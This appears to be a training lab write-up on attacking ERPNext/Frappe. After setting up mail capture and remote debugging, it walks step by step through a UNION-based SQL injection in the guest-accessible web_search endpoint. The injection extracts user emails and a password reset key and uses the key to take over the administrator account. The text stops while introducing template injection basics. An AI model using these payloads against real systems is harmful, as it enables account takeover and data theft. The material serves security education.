# ERPNext Authentication Bypass and Server Side Template Injection
This module explores a methodology for discovering vulnerabilities in ERPNext, an open-source ERP system built on the Frappe Web Framework. We begin with an in-depth analysis of a SQL injection vulnerability, originally discovered in Frappe, which allows us to bypass authentication and gain administrator access.

With administrator access, we then examine a Server-Side Template Injection (SSTI) vulnerability. Although it uses character blacklisting to prevent exploitation (`.__`), we demonstrate a bypass technique to execute system commands and achieve remote code execution.
## Getting Started
### Configuring the SMTP Server
We’ll need to send emails as part of bypassing the password reset functionality. To achieve this, we’ll configure ERPNext to use our Kali machine as its SMTP server.
First, log in to the ERPNext server via SSH: `ssh frappe@<ERPNext_IP_Address>`

#### Edit SMTP Settings
Next, modify the `site_config.json` file located at `frappe-bench/sites/site1.local/`, update the file to include the following:
```json
{
  "db_name": "_1bd3e0294da19198",
  "db_password": "32ldabYvxQanK4jj",
  "db_type": "mariadb",
  "mail_server": "<YOUR_KALI_IP>",
  "use_ssl": 0,
  "mail_port": 25,
  "auto_email_id": "admin@randomdomain.com"
}
```
#### Set Up SMTP Listener on Kali
To receive the emails, configure Kali to listen for SMTP connections using Python’s built-in `smtpd` module:
```bash
kali@kali:~$ sudo python2 -m smtpd -n -c DebuggingServer 0.0.0.0:25
```
This will start a simple SMTP server that accepts connections and prints messages to the terminal without storing them.
### Configuring Remote Debugging
Launch VS Code and install the Python extension.
On the ERPNext server (via SSH), install the Python debug server:
```bash
/home/frappe/frappe-bench/env/bin/pip install ptvsd
```
Next, let's open up the `Procfile` and **comment out the section that starts the web server**. We will manually start the web server later, when debugging is enabled.
```bash
frappe@ubuntu:~$ cat /home/frappe/frappe-bench/Procfile 
redis_cache: redis-server config/redis_cache.conf
redis_socketio: redis-server config/redis_socketio.conf
redis_queue: redis-server config/redis_queue.conf
#web: bench serve --port 8000

socketio: /usr/bin/node apps/frappe/socketio.js

watch: bench watch

schedule: bench schedule
worker_short: bench worker --queue short --quiet
worker_long: bench worker --queue long --quiet
worker_default: bench worker --queue default --quiet
```
Once the `ptvsd` module is installed, the next step is to configure the ERPNext application to open a remote debugging port. This is done by modifying the application's startup script so that it launches the `ptvsd` debug server during execution.
The file we need to edit is: `/home/frappe/frappe-bench/apps/frappe/frappe/app.py`

This `app.py` script is executed whenever the `bench serve` command is called, meaning it's part of the main startup process for the Frappe/ERPNext application. By injecting our debugging code early in this file, we ensure that the remote debugger starts as soon as the application launches.

To set this up, open `app.py` and add the following lines directly beneath the existing import statements:
```python
import ptvsd
ptvsd.enable_attach(redirect_output=True)
print("Now ready for the IDE to connect to the debugger")
ptvsd.wait_for_attach()
```
By default, `ptvsd` listens on port `5678`, so when you configure Visual Studio Code (or another IDE) to attach to the remote debugger, be sure it connects on this port.

Before starting the services, transfer the ERPNext source code to your Kali machine so you can debug it locally using VS Code. Use the following `rsync` command:
```bash
kali@kali:~$ rsync -azP frappe@<ERPNext_IP>:/home/frappe/frappe-bench ./

```
After the transfer, open Visual Studio Code on Kali and go to `File` > `Open Folder`, then select the `frappe-bench` directory. This setup enables remote debugging from your IDE.
#### Start Frappe and ERPNext with debugging
SSH into the ERPNext server and start the required services: `frappe@ubuntu:~/frappe-bench$ bench start`

In a second SSH session, start the web server manually:
```bash
frappe@ubuntu:~/frappe-bench$ cd /home/frappe/frappe-bench/sites

frappe@ubuntu:~/frappe-bench/sites$ ../env/bin/python ../apps/frappe/frappe/utils/bench_helper.py frappe serve --port 8000 --noreload --nothreading
Now ready for the IDE to connect to the debugger
```
Open `app.py` in Visual Studio Code (Explorer panel), then go to the `Run & Debug panel` → click `create a launch.json file`.

Choose `Python` → `Remote Attach`.

Enter:

    Host: ERPNext server IP

    Port: 5678

Set the path mapping in `launch.json`:
```json
{
  "version": "0.2.0",
  "configurations": [
    {
      "name": "Python: Remote Attach",
      "type": "python",
      "request": "attach",
      "port": 5678,
      "host": "<Your_ERPNext_IP>",
      "pathMappings": [
        {
          "localRoot": "${workspaceFolder}",
          "remoteRoot": "/home/frappe/frappe-bench/"
        }
      ]
    }
  ]
}
```
Save the file (`Ctrl+S`), then click the green `play` button to attach the debugger.
With the debugger connected, let's verify in the SSH console that the application is available on port `8000`.
```bash
frappe@ubuntu:~/frappe-bench/sites$ ../env/bin/python ../apps/frappe/frappe/utils/bench_helper.py frappe serve --port 8000 --noreload --nothreading
Now ready for the IDE to connect to the debugger
 * Running on http://0.0.0.0:8000/ (Press CTRL+C to quit)
```
### Configuring MariaDB Query Logging
Edit MariaDB config: `sudo nano /etc/mysql/my.cnf`
Uncomment the logging settings under the `Logging and Replication` section
```cnf
general_log_file = /var/log/mysql/mysql.log
general_log = 1

```
Restart MariaDB to apply changes:
```bash
sudo systemctl restart mysql
```
Monitor queries in real time:
```
sudo tail -f /var/log/mysql/mysql.log
```
### SQLI Authentication Bypass
Now that we have a list of endpoints accessible to unauthenticated users, we can start searching for vulnerabilities. A good approach is to identify functions that break the MVC or metadata-driven pattern—specifically, controllers that directly modify the model or view. Searching for SQL queries in these whitelisted functions (e.g., `whitelist(allow_guest=True)`) may help reveal issues.
#### SQLI Discovery
By searching for SQL in the `91` guest-whitelisted endpoints, we quickly identify the `web_search` function in `apps/frappe/frappe/utils/global_search.py`. To test it in Repeater, we set the request's `cmd` to `frappe.utils.global_search.web_search` and pass the required `text` parameter (e.g., `text=offsec`) after an ampersand (`&`) in the Burp request.

After identifying the `web_search` function in the guest-accessible endpoints, a request was crafted in Burp Suite using `cmd=frappe.utils.global_search.web_search` and the required `text` parameter (e.g., `text=offsec`). With debugging set up in VS Code, a breakpoint at line `487` allowed inspection of the SQL query before execution:
```sql
SELECT `doctype`, `name`, `content`, `title`, `route`
FROM `__global_search`
WHERE `published` = 1 AND MATCH(`content`) AGAINST ('"offsec"' IN BOOLEAN MODE)
LIMIT 20 OFFSET 0

```
Modifying the `scope` parameter (e.g., `scope=offsec_scope`) altered the query to:
```sql
... WHERE `published` = 1 AND `route` LIKE "offsec_scope%" AND ...

```
A SQL injection payload was crafted: `offsec_scope" UNION ALL SELECT 1,2,3,4,5#`
The successful response confirmed injection, mapping returned fields to the five selected values. Further payloads (e.g., replacing `5` with `@@version`) extracted database details: `10.2.24-MariaDB-10.2.24+maria~xenial-log`
This confirmed the vulnerability, enabling further exploitation to escalate privileges.
#### SQLI Exploitation -- Authentication Bypass
With SQL injection confirmed, the goal shifts to privilege escalation—specifically, logging in as the administrator. Since `PyMySQL` does not support stacked queries without `multi=True` (which isn't used), we are limited to read-only `SELECT` injections.

Frappe uses `PBKDF2` for password hashing, making password cracking difficult. A more viable path is hijacking the password reset token.

Frappe’s documentation shows that login data is stored in the `__Auth` table, but it does not store password reset keys. To locate the correct table, we trigger a password reset request using the email `token_searchForUserTable@mail.com`, while monitoring the MySQL logs.

The logs reveal a query to:
```bash
frappe@ubuntu:~$ sudo tail -f /var/log/mysql/mysql.log | grep token_searchForUserTable
  4980 Query     select * from `tabUser` where `name` = 'token_searchForUserTable@mail.com' order by modified desc
```
This confirms that password reset tokens are stored in the `tabUser` table, which becomes the next target for exploitation.
To extract user emails, we target the name column in the __Auth table. A basic query would be: `SELECT name FROM __Auth;`
To use this in a UNION-based SQL injection, we replace one of the placeholder values with `name` and append `FROM __Auth` to the query.
```sql
SELECT `doctype`, `name`, `content`, `title`, `route`
  FROM `__global_search`
  WHERE `published` = 1 AND  `route` like "offsec_scope" UNION ALL SELECT 1,2,3,4,name FROM __Auth#%" AND MATCH(`content`) AGAINST (\'\\"offsec\\"\' IN BOOLEAN MODE)
  LIMIT 20 OFFSET 0
```
This is where we run into our first error. Frappe responds with the error `"Illegal mix of collations for operation 'UNION'"`.
To avoid collation errors in the `UNION` query, we must first identify the collation of the `name` column in the `__global_search` table. This can be done with:
```sql
SELECT COLLATION_NAME 
FROM information_schema.columns 
WHERE TABLE_NAME = "__global_search" AND COLUMN_NAME = "name";
```
The request reveals that the `name` column in `__global_search` uses the `utf8mb4_general_ci` collation. With this, we update our injection payload to avoid collation errors:
```sql
SELECT name COLLATE utf8mb4_general_ci FROM __Auth;
```
This returns the response:
```json
{"message":[{"route":"Administrator","content":"3","relevance":0,"name":"2","title":"4","doctype":"1"},{"route":"zeljka.k@randomdomain.com","content":"3","relevance":0,"name":"2","title":"4","doctype":"1"}]}
```
Based on the response, the email we used to create the admin user was discovered. This is the account that we will target for the password reset. We can enter the email in the **`Forgot Password`** field.
Selecting **`Send Password`** will create the password reset token for the user and send an email about the password reset.

To identify the column storing the password reset key in the `tabUser` table, we use the following SQL injection payload adapted for a UNION-based attack:
```sql
SELECT COLUMN_NAME 
FROM information_schema.columns 
WHERE TABLE_NAME = "tabUser";
```
Sending that SQL injection payload returns the JSON:
```json
{"message":[{"name":"2","content":"3","relevance":0,"title":"4","doctype":"1","route":"name"},...,{"name":"2","content":"3","relevance":0,"title":"4","doctype":"1","route":"birth_date"},{"name":"2","content":"3","relevance":0,"title":"4","doctype":"1","route":"reset_password_key"},{"name":"2","content":"3","relevance":0,"title":"4","doctype":"1","route":"email"},{"name":"2","content":"3","relevance":0,"title":"4","doctype":"1","route":"_comments"},{"name":"2","content":"3","relevance":0,"title":"4","doctype":"1","route":"allowed_in_mentions"}]}
```
From the list of columns, we notice `reset_password_key`. We can use this column name to extract the password reset key. We should also include the name column to ensure that we are obtaining the reset key for the correct user. The query for this is: 
```sql
SELECT name COLLATE utf8mb4_general_ci, reset_password_key COLLATE utf8mb4_general_ci
FROM tabUser;
```
The SQL query in Listing 49 needs to conform to the UNION query. This time, we will use the number "1" for the name/email and number "5" for the reset_password_key. The updated query:
```sql
SELECT `doctype`, `name`, `content`, `title`, `route`
  FROM `__global_search`
  WHERE `published` = 1 AND  `route` like "offsec_scope" UNION ALL SELECT name COLLATE utf8mb4_general_ci,2,3,4,reset_password_key COLLATE utf8mb4_general_ci FROM tabUser#%" AND MATCH(`content`) AGAINST (\'\\"offsec\\"\' IN BOOLEAN MODE)
  LIMIT 20 OFFSET 0'
```
The Burp response contains the `password_reset_key` in the `"route"` string with the email in the `"doctype"` string.
```json
{"message":[{"name":"2","content":"3","relevance":0,"title":"4","doctype":"Administrator","route":null},{"name":"2","content":"3","relevance":0,"title":"4","doctype":"Guest","route":null},{"name":"2","content":"3","relevance":0,"title":"4","doctype":"zeljka.k@randomdomain.com","route":"aAJTVmS14sCpKxrRT8N7ywbnYXRcVEN0"}]}
```
Now that we have the `password_reset_key`, let's figure out how to use it to reset the password. We will search the application's source code for `"reset_password_key"` with the idea that wherever this column is used, it will most likely give us a hint on how to use the key.
Searching for `"reset_password_key"` allows us to discover the `reset_password` function in the file `apps/frappe/frappe/core/doctype/user/user.py`. The function can be found below.
```python
	def reset_password(self, send_email=False, password_expired=False):
		from frappe.utils import random_string, get_url

		key = random_string(32)
		self.db_set("reset_password_key", key)

		url = "/update-password?key=" + key
		if password_expired:
			url = "/update-password?key=" + key + '&password_expired=true'

		link = get_url(url)
		if send_email:
			self.password_reset_mail(link)

		return link
```
The `reset_password` function is used to generate the `reset_password_key`. Once the random key is generated, a link is created and emailed to the user. We can use the format of this link to attempt a password reset. The link we will visit in our example is:
```
http://erpnext:8000/update-password?key=aAJTVmS14sCpKxrRT8N7ywbnYXRcVEN0
```
If we type in a new password, we should receive a `"Password Updated"` message!
We should now be able to log in as the administrator user (`zeljka.k@randomdomain.com`) using our new password.
### SSTI to Command Execution
With admin access via SQL injection, the next step is to attempt remote code execution. Since Frappe extensively uses the Jinja1 templating engine—especially in ERPNext's email templates—Server Side Template Injection (SSTI) becomes a promising attack vector. To proceed, it's essential to understand how templating engines work and how they can be exploited.

Templating engines render dynamic content based on user context—for example, displaying `"Hello, Guest"` or `"Hello, Username"` in a header. They help separate views from logic in the MVC model and support reusable content.

These engines use delimiters to define template blocks. In Jinja (and Python), `{{ }}` denotes expressions (e.g., `{{ 7*7 }}`), and `{% %}` denotes statements (e.g., `{% print("hello") %}`).
Espression: Combination of variables and operations that results in a value. (e.g, `{{7*7}}`)
Statement: represent an action. (e.g, `print("Hello, World!")`)
